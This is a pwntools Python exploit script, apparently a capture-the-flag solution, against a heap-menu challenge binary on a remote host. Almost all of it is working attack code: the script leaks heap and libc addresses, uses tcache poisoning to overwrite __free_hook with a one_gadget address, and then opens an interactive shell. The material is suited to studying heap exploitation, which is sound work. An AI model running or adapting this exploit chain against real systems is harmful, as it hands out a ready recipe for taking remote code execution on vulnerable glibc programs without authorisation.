#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.243 --port 5592 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.243'
port = int(args.PORT or 5592)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = ELF("./libc-2.27.so")


# 0x555555400972
def add(idx,title,page):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(title))
    io.sendlineafter(": ",str(page))

# 0x555555400b7c
def read(row,col,read):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(row))
    io.sendlineafter(": ",str(col))
    io.sendline(str(read))

# 0x555555400dd3
def rearrange():
    io.sendlineafter("> ","3")

for i in range(2):
    add(0,('a'+str(i))*4,0x20)

read(0,0,1)
read(0,0,1)
read(0,0,0)

io.recvuntil(": ")
heap=u64(io.recvline()[:-1].ljust(8,"\x00"))
print "Heap leak:",hex(heap)

for i in range(3):
    add(0,('a'+str(i))*4,0x20)

for i in range(8):
    add(1,('b'+str(i))*4,0x20)

for i in range(8):
    add(2,('c'+str(i))*4,0x20)

for i in range(2):
    add(3,"test",0x20)

for i in range(8):
    add(4,"JUNK",0x20)

for i in range(8):
    add(5,p64(0)+p64(0x21),0x20)

for i in range(3):
    add(6,"mantap",0x20)


for i in range(7):
    read(1,0,1)

# for i in range(3):
# read(0,1,1)
read(0,2,1)
read(0,1,1)
read(0,0,1)
read(0,2,1)

for i in range(7):
    add(1,('b'+str(i))*4,16)

add(0,p64(heap+0x40-0x10),0)

add(0,"JUNK",0)
add(0,p64(0)+p64(23),0)

add(0, p64(0)+p64(0x461),0x461)

read(0,1,1)
# read(0,1,0)

add(0, 'a'*8,0x461)

read(1,7,0)

io.recvuntil(": ")
leak=u64(io.recvline()[:-1].ljust(8,"\x00"))
print "leak:",hex(leak)
libc.address = leak - 0x3ebca0
print "libc:",hex(libc.address)
print hex(libc.sym['free'])
free_hook = libc.sym['__free_hook']

off = [0x4f3d5,0x4f432,0x10a41c]
one = libc.address + off[2]
print hex(one)

for i in range(8):
    read(4,0,1)

read(3,1,1)
read(3,0,1)
read(3,1,1)

for i in range(6):
    add(4,('b'+str(i))*4,16)

add(3,p64(free_hook),0)

add(3,"JUNK",0)
add(3,"JUNK",0)

add(3,p64(one),0)

read(3,0,1)


# x/100gx 0x555555602040 int check[8]

# x/100gx 0x555555602060 long int book[8][8]

# read(0,0,1)
# read(0,1,1)
# read(0,1,0)

# for i in range(1):
#     add(0,('a'+str(i))*4,16)

# read(0,0,1)

# for i in range(7):
#     add(0,('a'+str(i))*4,16)




io.interactive()

